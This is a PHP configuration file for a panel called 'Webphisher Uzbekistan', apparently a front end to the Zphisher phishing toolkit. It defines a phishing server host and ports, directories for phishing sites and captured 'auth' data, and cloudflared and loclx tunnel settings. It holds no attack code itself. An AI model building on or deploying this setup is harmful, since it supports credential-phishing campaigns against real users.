<?php
declare(strict_types=1);

define('PANEL_ROOT', __DIR__);
define('ZPHISHER_ROOT', dirname(__DIR__));
define('PANEL_VERSION', '1.0.0');
define('APP_NAME', 'Webphisher Uzbekistan');
define('ZPHISHER_VERSION', '2.3.5');

define('DEFAULT_PHISH_HOST', '127.0.0.1');
define('DEFAULT_PHISH_PORT', 8080);
define('DEFAULT_PANEL_PORT', 9090);

define('SERVER_DIR', ZPHISHER_ROOT . DIRECTORY_SEPARATOR . '.server');
define('WWW_DIR', SERVER_DIR . DIRECTORY_SEPARATOR . 'www');
define('SITES_DIR', ZPHISHER_ROOT . DIRECTORY_SEPARATOR . '.sites');
define('AUTH_DIR', ZPHISHER_ROOT . DIRECTORY_SEPARATOR . 'auth');
define('DATA_DIR', PANEL_ROOT . DIRECTORY_SEPARATOR . 'data');
define('DB_PATH', DATA_DIR . DIRECTORY_SEPARATOR . 'panel.db');

define('PID_PHP', SERVER_DIR . DIRECTORY_SEPARATOR . '.php.pid');
define('PID_CLOUDFLARED', SERVER_DIR . DIRECTORY_SEPARATOR . '.cloudflared.pid');
define('PID_LOCLX', SERVER_DIR . DIRECTORY_SEPARATOR . '.loclx.pid');
define('LOG_CLOUDFLARED', SERVER_DIR . DIRECTORY_SEPARATOR . '.cld.log');
define('LOG_LOCLX', SERVER_DIR . DIRECTORY_SEPARATOR . '.loclx');

date_default_timezone_set('UTC');

if (!is_dir(DATA_DIR)) {
    mkdir(DATA_DIR, 0755, true);
}
if (!is_dir(SERVER_DIR)) {
    mkdir(SERVER_DIR, 0755, true);
}
if (!is_dir(AUTH_DIR)) {
    mkdir(AUTH_DIR, 0755, true);
}
